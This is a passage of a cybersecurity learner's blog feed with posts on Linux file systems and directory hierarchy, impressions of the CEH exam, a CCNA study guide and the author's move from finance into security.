<p>Btrfs, or the Better File System, is a modern copy-on-write file system designed for improved data management and fault tolerance. It incorporates features like snapshots, checksums, and efficient storage allocation. Btrfs offers the flexibility to dynamically resize file systems, allowing users to expand or contract them as needed, making it a versatile option for configurations involving both single and multiple disks.</p>
<table>
<thead>
<tr>
<th><strong>Advantages</strong></th>
<th><strong>Disadvantages</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Modern, copy-on-write (COW) file system with advanced features (online defragmentation, data deduplication etc.)</td>
<td>While Btrfs has made significant progress, it&rsquo;s still considered under development and may not be as stable as more mature file systems like Ext4 or XFS</td>
</tr>
<tr>
<td>Snapshots facilitates straightforward backups and simplify the process of system recovery</td>
<td>Btrfs&rsquo;s Copy-on-Write (COW) mechanism can lead to file fragmentation over time, potentially impacting performance</td>
</tr>
</tbody>
</table>
<h2 id="f2fs-flash-friendly-file-system">F2FS (Flash-Friendly File System)</h2>
<p>Designed for flash-based storage devices such as SSDs and eMMC, F2FS aims to reduce unnecessary writes, minimizing write amplification, and extending the lifespan of flash storage. Excelling in situations where traditional file systems face challenges, F2FS emerges as a top choice for embedded devices and smartphones due to its superior performance. Its optimization for flash-based storage devices, along with reduced write overhead, makes F2FS a favorable file system for devices with flash memory.</p>
<table>
<thead>
<tr>
<th><strong>Advantages</strong></th>
<th><strong>Disadvantages</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Optimized for flash-based storage devices (SSDs and eMMCs)</td>
<td>F2FS is still not as widely adopted as more established file systems like Ext4 or XFS</td>
</tr>
<tr>
<td>Reduced write overhead, leading to longer flash storage life</td>
<td>F2FS lacks some data integrity features found in other file systems, such as checksums or extensive journaling</td>
</tr>
</tbody>
</table>
<h2 id="conclusion">Conclusion</h2>
<p>Whether you are attacking or defending digital assets, you will benefit from knowing which file system you are dealing with as they each have their own vulnerabilities and strengths. If you are responsible for building network infrastructure or systems, carefully analyzing your requirements will allow you to decide which file system type is most beneficial for you. Linux&rsquo;s versatility makes it an ideal choice for a plethora of applications, be it for personal use or enterprise-level solutions.</p>
]]></content>
        </item>
        
        <item>
            <title>Demystifying the Linux File System Hierarchy</title>
            <link>https://scorpiosec.com/posts/2024/01/demystifying-the-linux-file-system-hierarchy/</link>
            <pubDate>Sun, 14 Jan 2024 20:05:43 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/01/demystifying-the-linux-file-system-hierarchy/</guid>
            <description>Linux File Hierarchy Structure Proficiency in Linux is indispensable for cybersecurity professionals, you may have noticed that Linux is different from Windows in the way files are organized. The Filesystem Hierarchy Standard (FHS) maintained by the Linux Foundation provides a model for the directories structure. While there may be some variations across Linux distributions, they typically adhere to this standard. To enhance your Linux skills, a fundamental understanding of the file system is essential.</description>
            <content type="html"><![CDATA[<h2 id="linux-file-hierarchy-structure">Linux File Hierarchy Structure</h2>
<p>Proficiency in Linux is indispensable for cybersecurity professionals, you may have noticed that Linux is different from Windows in the way files are organized. The Filesystem Hierarchy Standard (FHS) maintained by the Linux Foundation provides a model for the directories structure. While there may be some variations across Linux distributions, they typically adhere to this standard. To enhance your Linux skills, a fundamental understanding of the file system is essential. In this blog post we will explore the Linux file system.</p>
<blockquote>
<p>This is not an exhaustive list but we will look at the most common directories.</p>
</blockquote>
<p><img src="/images/Linux-File-Hierarchy-Structure.png" alt="Linux Filesystem Overview">
<em>Linux Filesystem Overview</em></p>
<h2 id="-root">/ (Root)</h2>
<p>At the core of the Linux Filesystem Hierarchy you have the root directory represented by the symbol &ldquo;/&rdquo;. This directory is the starting point for the entire file system.</p>
<ul>
<li>Every single file and directory start from the root directory</li>
<li>Only the root user has write permissions under this directory</li>
<li>The home directory of the root user is /root</li>
<li>Executing <code>ls -l /</code> will display the contents of the root directory</li>
</ul>
<h2 id="bin--sbin">/bin &amp; /sbin</h2>
<p>These directories contain essential binaries and system commands. While both directories house binary files, there is a fundamental distinction in the types of binaries they contain.</p>
<p>The /bin directory, derived from &lsquo;binary,&rsquo; is reserved for storing vital executable binaries crucial to the core functionality of the operating system. These binaries are necessary for user interactions and are often used in single-user mode. Common commands such as ls (list files), cp (copy), and mv (move) find their home in the /bin directory.</p>
<p>Conversely, the /sbin directory, representing &lsquo;system binary,&rsquo; contains binaries designed exclusively for system administration and maintenance tasks. Unlike the binaries in /bin, those in /sbin are typically intended for use by the system administrator rather than regular users. System binaries essential for tasks like system recovery, repair, and diagnostics are housed here.</p>
<table>
<thead>
<tr>
<th><strong>/bin</strong></th>
<th><strong>/sbin</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Contains common linux commands used in single-user modes such as ps, ls, ping, grep, cp, etc.</td>
<td>Contains commands typically used by system administrators such as iptables, reboot, fdisk, ifconfig, swapon, etc.</td>
</tr>
</tbody>
</table>
<h2 id="boot">/boot</h2>
<p>The /boot directory houses critical files that are essential for the booting process of the operating system. The boot loader files and the Linux kernel are stored in this directory. The bootloader is responsible for initiating the operating system during the boot process. As the initial phase of a Linux system&rsquo;s startup sequence, the contents of /boot are integral to initiating the kernel and facilitating a smooth boot experience. Corrupting or deleting certain files in this directory can hinder the correct booting of your system.</p>
<h2 id="dev">/dev</h2>
<p>The /dev directory serves as a gateway to the device files that represent hardware devices connected to the system. Unlike regular files, these device files act as interfaces, enabling communication between the operating system and hardware components.</p>
<p>The name &ldquo;/dev&rdquo; is short for &ldquo;device,&rdquo; and this directory acts as a virtual filesystem containing entries for each device or pseudo-device connected to the system. These entries are represented as special files, allowing processes to interact with hardware through standardized input and output operations.</p>
<p>Inside the /dev directory, you will find various devices files. Here are a few of them:</p>
<ul>
<li><em>/dev/fd</em> - Floppy disk devices</li>
<li><em>/dev/tty</em> - Terminal devices representing console and serial ports</li>
<li><em>/dev/sda</em> (1,2,3, etc.) - disk devices representing hard drives</li>
<li><em>/dev/usb</em> (1,2,3, etc.) - USB device entries</li>
</ul>
<h2 id="etc">/etc</h2>
<p>The /etc directory serves as a central hub for configuration files that dictate the behavior of the operating system, system services, and installed applications. These configuration files are often plain text files and serve as a means to customize and fine-tune the settings of different components.</p>
<p>Linux adheres to the principle of separating configuration data from executables by centralizing configuration files in /etc. This separation allows for easier system administration, as modifications and updates to settings can be made without altering the core functionality of the associated programs. In this directory you can find:</p>
<ul>
<li><em>/etc/passwd</em> - Contains user account information, including usernames, user IDs, and home directories (believe it or not, your actual passwords aren&rsquo;t here)</li>
<li><em>/etc/hosts</em> - Mapping of IP addresses to hostnames, facilitating local hostname resolution</li>
<li><em>/etc/shadow</em> - Stores user passwords in an encrypted hashed format</li>
<li><em>/etc/network/</em> - Configuration files for network settings, including interfaces and routing</li>
</ul>
<h2 id="home">/home</h2>
<p>The /home directory functions as a private space for each user, encompassing individual user home directories like Documents, Downloads, Desktop, Pictures, etc. Its primary purpose is to provide a dedicated space for storing the personal files, documents, and settings of individual users. When a new user account is created, a corresponding directory is established within /home, encapsulating their unique environment.</p>
<h2 id="lib">/lib</h2>
<p>The /lib directory contains shared libraries and kernel modules. Short for &ldquo;library&rdquo;, this directory ensures the availability of essential resources that support the functioning of various programs and applications on a Linux system such as the binaries in /bin and /sbin.</p>
<p>Shared libraries, also known as dynamic-link libraries, are compiled code modules that multiple programs can use simultaneously. Placing these shared libraries in /lib ensures that they are readily accessible to the applications that depend on them, promoting efficiency and resource optimization.</p>
<p>Kernel modules, which extend the functionality of the Linux kernel, are also stored in /lib. These modules can be dynamically loaded or unloaded as needed, enhancing the adaptability and versatility of the operating system.</p>
<h2 id="media">/media</h2>
<p>The /media directory is a mount point for removable media devices such as USB drives, external hard disks, and optical discs. Acting as a temporary staging area for these devices, /media allows users to access and interact with their contents seamlessly.</p>
<p>It plays a crucial role in providing a standardized location for mounting external and removable storage devices. When a user connects a USB drive or inserts an optical disc, the operating system mounts the device to a subdirectory within /media, creating a point of access for users to read, write, and manage the contents.</p>
<h2 id="mnt">/mnt</h2>
<p>The /mnt directory act as a generic mount point for temporary filesystems and remote file systems. Unlike the /media directory, which is specifically designed for removable media, /mnt is a flexible and manually managed location that allows users and administrators to mount various filesystems as needed.</p>
<p>The /mnt directory acts as a staging area for temporarily mounting additional filesystems, whether they are local or remote. This flexibility makes /mnt a versatile location for accessing data from different sources, such as network shares, external drives, or filesystems intended for temporary use.</p>
<p>While /media is dedicated to automatically mounting removable media devices, /mnt provides a more manual and customizable approach, allowing users to mount and access various filesystems based on their specific requirements.</p>
<h2 id="opt">/opt</h2>
<p>The /opt directory is designated for the installation of optional or add-on software packages. Abbreviated from &ldquo;optional,&rdquo; /opt provides a standardized location for third-party applications that are not part of the core system but are added to enhance the functionality of the operating system.</p>
<p>The /opt directory is a dedicated space for software vendors and developers to install their applications without interfering with the standard system files and directories. This separation ensures that optional software packages do not disrupt the core system components and adhere to a consistent installation structure.</p>
<p>Applications installed in /opt typically have their own subdirectories, containing the necessary binaries, libraries, documentation, and other resources. This organization simplifies the management and removal of optional software, promoting a clean and modular approach to extending the capabilities of the Linux system.</p>
<h2 id="tmp">/tmp</h2>
<p>The /tmp directory is a temporary storage location for files that are required during the course of system operations. Abbreviated from &ldquo;temporary&rdquo;, /tmp is intended for the storage of transient data that may be needed by applications, processes, or users and is automatically cleared upon system reboot.</p>
<p>This is designed to be a shared space for storing temporary files, facilitating communication between different processes and allowing applications to create and manipulate temporary data as needed. The key characteristics of /tmp include its ephemeral nature and the absence of persistent storage, making it an ideal location for short-term storage requirements.</p>
<h2 id="usr">/usr</h2>
<p>The /usr directory is a fundamental component of the Linux filesystem, housing user-related resources, secondary user programs, and data. Abbreviated from &ldquo;Unix System Resources&rdquo;, /usr encompasses a wide range of directories, each contributing to the overall functionality and organization of the Linux operating system.</p>
<p>The /usr directory is designed to contain user-related resources and secondary user programs that are not essential for system booting and repair. It plays a crucial role in separating the core system binaries in /bin and /sbin from additional programs and resources that enhance the user experience.</p>
<h2 id="conclusion">Conclusion</h2>
<p>This overview is just the tip of the iceberg. You can dive deeper into each directory to further your understanding of the Linux Filesystem Hierarchy. If you are looking for books, I suggest <a href="https://www.amazon.com/How-Linux-Works-Brian-Ward/dp/1718500408" target="_blank" >How Linux Works, What Every Superuser Should Know, 3rd Edition</a>

 and <a href="https://linuxcommand.org/tlcl.php" target="_blank" >The Linux Command Line, 2nd Edition: A Complete Introduction</a>

 (the second book is free).</p>
<p>I hope this blog post was helpful to you. Keep learning!</p>
]]></content>
        </item>
        
        <item>
            <title>CEH Exam Insights: A Nuanced Look at Ethical Hacking Certifications</title>
            <link>https://scorpiosec.com/posts/2024/01/ceh-exam-insights-a-nuanced-look-at-ethical-hacking-certifications/</link>
            <pubDate>Sun, 07 Jan 2024 21:13:59 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/01/ceh-exam-insights-a-nuanced-look-at-ethical-hacking-certifications/</guid>
            <description>Introduction In the ever-evolving landscape of cybersecurity, the Certified Ethical Hacker (CEH) certification has long been a topic of discussion and debate. It is actually one of the oldest certifications out there, being introduced in 2003 by EC-Council. The exam has garnered a lot of criticism primarily due to its reliance on the multiple-choice format. This blog post aims to honestly give my perspective of the CEH certification, addressing the skepticism surrounding its examination method while shedding light on its significance in the realm of ethical hacking.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>In the ever-evolving landscape of cybersecurity, the Certified Ethical Hacker (CEH) certification has long been a topic of discussion and debate. It is actually one of the oldest certifications out there, being introduced in 2003 by EC-Council. The exam has garnered a lot of criticism primarily due to its reliance on the multiple-choice format. This blog post aims to honestly give my perspective of the CEH certification, addressing the skepticism surrounding its examination method while shedding light on its significance in the realm of ethical hacking.</p>
<p><img src="/images/CEH-jobs.png" alt="CEH job postings on LinkedIn">
<em>8,941 jobs listing CEH at the time of writing on LinkedIn</em></p>
<h2 id="the-controversy-multiple-choice-and-its-critics">The Controversy: Multiple Choice and its Critics</h2>
<p>I am sure you have seen it online (YouTube, Reddit, etc.), statements like &ldquo;The CEH won&rsquo;t teach you anything&rdquo;, &ldquo;CEH is useless!&rdquo; and so on. Critics argue that because hacking is a dynamic field requiring hands-on knowledge traditional exam methods are ineffective. While I agree with the sentiment I also think that we should scrutinize this stance. First, I believe that the CEH does not replicate the hands-on nature of hacking but I agree that it serves its purpose which is to be a standardized measure to evaluate foundational theorical knowledge, ensuring a common baseline for ethical hacking professionals.</p>
<p>So let me be honest here, the CEH <strong>did</strong> teach me a lot of things especially as a beginner. Most people &ldquo;memorize&rdquo; the material just to pass the exam and act surprised that they didn&rsquo;t retain anything after. During my preparation I &ldquo;studied&rdquo; and came out with some solid knowledge, I supplemented the theoretical knowledge with some labs to deepen my understanding of the concepts.</p>
<p>My second point might be biased but hear me out. Apparently HR departments love the CEH, it is listed on most security jobs. I am convinced that finding a job in cybersecurity today is a number game, so you have to work on two fronts which are: how you appear to potential employers and your actual technical skills. Especially, if you are a self-taught cybersecurity individual you need to put as many chances on your side as possible. Nothing is preventing you from getting the CEH as an HR checking certification and actually developing deep technical skills.</p>
<p>My final point on this whole CEH thing is simple. Get it if you are <strong>not</strong> paying for it (as it costs $950-$1,199). You will learn if you actually apply yourself and it will serve its HR bypass function.</p>
<h2 id="overview-of-the-ceh-exam">Overview of the CEH exam</h2>
<p>The exam tests you on 20 areas of ethical hacking ranging from Footprinting and Reconnaissance to Cryptography. You can get a full list of the modules <a href="https://www.eccouncil.org/wp-content/uploads/2022/09/CEH-brochure.pdf" target="_blank" >here</a>

 starting at page 6. The exam has 125 questions and you will have four hours to complete it.</p>
<p>The official training you get when you purchase your voucher is exactly what you will be tested on, nothing more. A few things I noticed during my exam:</p>
<ul>
<li>
<p>It is very tools focused - You will need to know different tools used for various tasks (scanning, session hijacking, enumeration etc.).</p>
</li>
<li>
<p>You will get a lot of questions about commands - Beyond knowing tools you need to know how they are used to achieve x or y.</p>
</li>
<li>
<p>The cryptography and malware concepts can be hard to grasp at first especially if you are a beginner, put more focus on these modules.</p>
</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>While I acknowledge that the criticism about the CEH is valid, I think it does provide some value by helping you with HR and teaching about a lot of topics related to ethical hacking. You should go for it if you are getting sponsored. I encourage you to have a balanced view of certifications, and make informed decisions based on your career goals and personal situation. At the end of the day, you know what is best for you. I also recommend complementing that CEH with hands-on experience by doing labs.</p>
]]></content>
        </item>
        
        <item>
            <title>Cracking the CCNA: A Step-by-Step Guide to Exam Success</title>
            <link>https://scorpiosec.com/posts/2024/01/cracking-the-ccna-a-step-by-step-guide-to-exam-success/</link>
            <pubDate>Tue, 02 Jan 2024 20:08:15 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/01/cracking-the-ccna-a-step-by-step-guide-to-exam-success/</guid>
            <description>Introduction Picture yourself attempting to solve a complex mathematical equation, without a firm grasp of basic arithmetic. In the world of ethical hacking, skipping over the foundational principles of networking before tackling advanced tasks is akin to trying to solve differential equations without first mastering addition and subtraction. You cannot attack or defend what you do not understand.
The same way math classes build upon each other, proficiency in ethical hacking relies on a strong understanding of networking fundamentals.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Picture yourself attempting to solve a complex mathematical equation, without a firm grasp of basic arithmetic. In the world of ethical hacking, skipping over the foundational principles of networking before tackling advanced tasks is akin to trying to solve differential equations without first mastering addition and subtraction. You cannot attack or defend what you do not understand.</p>
<p>The same way math classes build upon each other, proficiency in ethical hacking relies on a strong understanding of networking fundamentals. If you want to build a solid foundation and get a certification, look no further than the Cisco Certified Network Associate (CCNA) certification. It will teach you everything you need to start and add more value to your resume. The exam lasts 120 minutes, you can expect 100-120 questions and it costs $300. You won’t be able to backtrack on questions, so even if you don’t know the answer, pick something.</p>
<p><img src="/images/CCNA-jobs.png" alt="CCNA job postings on Indeed">
<em>6,395 jobs listing CCNA at the time of writing</em></p>
<h2 id="overview-of-the-ccna-exam">Overview of the CCNA exam</h2>
<p>The exam is designed to assess your proficiency in a broad range of networking concepts. You will need to know how to accomplish some networking tasks from basic IP addressing to configuring routers and switches. Here is an overview of the exam objectives:</p>
<ul>
<li>
<p>Network Fundamentals: This section examines your grasp of networking concepts, including the OSI model, TCP/IP protocols, and the fundamentals of routing and switching.</p>
</li>
<li>
<p>Network Access: Delving into the nitty-gritty of network access, this domain assesses your understanding of VLANs, Ethernet, wireless networks, and more.</p>
</li>
<li>
<p>IP Connectivity: Testing your ability to configure and troubleshoot IP addressing, routing, and subnetting, this domain ensures you can navigate the intricacies of IP connectivity.</p>
</li>
<li>
<p>IP Services: From Network Address Translation (NAT) to DHCP and beyond, this section evaluates your proficiency in essential IP services that form the backbone of network functionality.</p>
</li>
<li>
<p>Security Fundamentals: In an era of increasing cyber threats, this domain ensures you can implement basic security measures, protecting networks from potential vulnerabilities.</p>
</li>
<li>
<p>Automation and Programmability: Reflecting the evolving landscape of networking, this section gauges your knowledge of automation tools and programmability concepts.</p>
</li>
</ul>
<p>Check out this link for a more detailed breakdown of the objectives: <a href="https://learningnetwork.cisco.com/s/ccna-exam-topics" target="_blank" >CCNA Exam Topics</a>

</p>
<h2 id="study-resources">Study Resources</h2>
<p>There are many affordable resources to prepare for the exam. Keep in mind you only need to use two resources from the list below. One course to learn the concepts and some practice exams.</p>
<ul>
<li>
<p><a href="https://www.youtube.com/playlist?list=PLxbwE86jKRgMpuZuLBivzlM8s2Dk5lXBQ" target="_blank" >Jeremy&rsquo;s IT Lab</a>

 - This is a complete CCNA course <strong>free of charge</strong> on YouTube. I have only heard good things about it. I didn&rsquo;t know of it during my preparation otherwise I would have used it. I went through it after passing my exam and it&rsquo;s great!</p>
</li>
<li>
<p><a href="https://www.udemy.com/course/ccna-complete/" target="_blank" >Neil Anderson</a>

 - This is the highest rated CCNA course on Udemy, there are numerous people in the CCNA subreddit who testify to passing the exam using this course so it has to be good.</p>
</li>
<li>
<p><a href="https://www.udemy.com/course/complete-networking-fundamentals-course-ccna-start/" target="_blank" >David Bombal</a>

 - This is the course I used, it has everything you need to succeed. David explains every concept in simple terms.</p>
</li>
</ul>
<blockquote>
<p>You will also need some  practice exams</p>
</blockquote>
<ul>
<li>
<p><a href="https://www.boson.com/practice-exam/200-301-cisco-ccna-practice-exam" target="_blank" >Boson Exams</a>

 - I got this set of practice exams. It is usually the most recommended on the CCNA subreddit. It is challenging enough and they explain every answer in great details.</p>
</li>
<li>
<p><a href="https://courses.jeremysitlab.com/" target="_blank" >Jeremy&rsquo;s IT Lab</a>

 - You can grab two practice exams from Jeremy&rsquo;s website for $20. I didn&rsquo;t use it but judging by the quality of his course on YouTube, I bet they are great, plus they are way less expensive than Boson.</p>
</li>
</ul>
<h2 id="study-plan">Study Plan</h2>
<p>The exam is multiple choice but don&rsquo;t let that fool you, it is challenging and you won&rsquo;t pass it if you only have theoretical knowledge. Some questions will require you to complete some actual networking tasks by configuring devices so do not neglect the labs and get very familiar with the commands (some questions are just about commands). Your plan should be to learn a concept, then do some lab related to it, rinse and repeat. I can&rsquo;t exactly share what questions you will see but here are a few things you should focus on:</p>
<ul>
<li>
<p>Subnetting - This is the concept people complain the most about on the subreddit, and rightfully so. If you cannot do subnetting relatively quickly you will miss <strong>a lot</strong> of points, so make sure you know it!</p>
</li>
<li>
<p>Port numbers - Learn the most common port numbers for SSH, HTTP, HTTPS etc.</p>
</li>
<li>
<p>TCP vs UDP protocols - In addition to port numbers, you need to know the differences between these two protocols.</p>
</li>
<li>
<p>ACLs (Access Control Lists) - Make sure you can read and configure ACLs (I slacked on this concept and missed a few questions because of it).</p>
</li>
</ul>
<h2 id="closing-words">Closing Words</h2>
<p>You might see or read posts discouraging people without networking experience from taking the exam, <strong>DO NOT LISTEN TO THEM</strong>. I went from knowing nothing about networking to passing the exam, and you can too. Moreover, if you have read my first blog post you know that I don&rsquo;t even have a technical background so I wholeheartedly encourage anyone who wants to take the CCNA exam.
Consistency will be your best friend, you will have days when you study for many hours and others when you don’t have as much time. Just focus on doing as much as you can every day. Best of luck, future network maestros! You&rsquo;ve got this!</p>
]]></content>
        </item>
        
        <item>
            <title>How It All Started</title>
            <link>https://scorpiosec.com/posts/2023/12/how-it-all-started/</link>
            <pubDate>Mon, 18 Dec 2023 17:26:43 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2023/12/how-it-all-started/</guid>
            <description>A couple of years ago it seemed unreal that someone like me could learn &amp;ldquo;techy&amp;rdquo; things, yet here I am telling you how I went from financial statements to firewalls in one and a half years.
After my bachelor&amp;rsquo;s degree in Finance, I just knew that it wasn&amp;rsquo;t the right fit for me. Honestly, I never really thought much about what I wanted to do and I went for that major as a &amp;ldquo;default&amp;rdquo; choice.</description>
            <content type="html"><![CDATA[<p>A couple of years ago it seemed unreal that someone like me could learn &ldquo;techy&rdquo; things, yet here I am telling you how I went from financial statements to firewalls in one and a half years.</p>
<p>After my bachelor&rsquo;s degree in Finance, I just knew that it wasn&rsquo;t the right fit for me. Honestly, I never really thought much about what I wanted to do and I went for that major as a &ldquo;default&rdquo; choice.</p>
<p>I started to wonder &ldquo;What else could I do?&rdquo; The only interesting option for me was something in the tech field. There was one significant mental hurdle  though, I believed that someone without a technical background like me couldn&rsquo;t succeed in that industry especially for something as complicated as cybersecurity?</p>
<p>Still, I started doing some research and experimented with web development, data analysis, and even game development. I wasn&rsquo;t really putting any effort, it was more like a hobby at that point.</p>
<p>The real defining moment happened when I stumbled upon YouTube channels like David Bombal, NetworkChuck, and John Hammond. Their videos changed my perspective and convinced me that technical knowledge wasn&rsquo;t exclusive to those with traditional IT/CS backgrounds as long as one&rsquo;s willing to put in the work.</p>
<p>With this new inspiration I set out to build a strong foundation first by learning the fundamentals. I studied networking, operating systems, security fundamentals and scripting/programming in Bash and Python. It wasn&rsquo;t easy but I wanted to prove to myself that I could do it so I stuck with it.</p>
<p>After a few months I wanted to solidify and confirm my knowledge, I looked up the the most popular certifications for the areas that interested me and I successfully passed the CCNA (Cisco Certified Network Associate) and CEH (Certified Ethical Hacker) exams the following year.</p>
<p>This blog is not just about documenting my journey, I want to help any way I can and connect with like-minded people. I will share the challenges I face, the victories I celebrate, the knowledge I pick up along the way and the resources that help me get better. Whether you are a seasoned professional, someone who just started, or thinking about transitioning into the cybersecurity space there is a place for you here.</p>
]]></content>
        </item>
        
    </channel>
</rss>
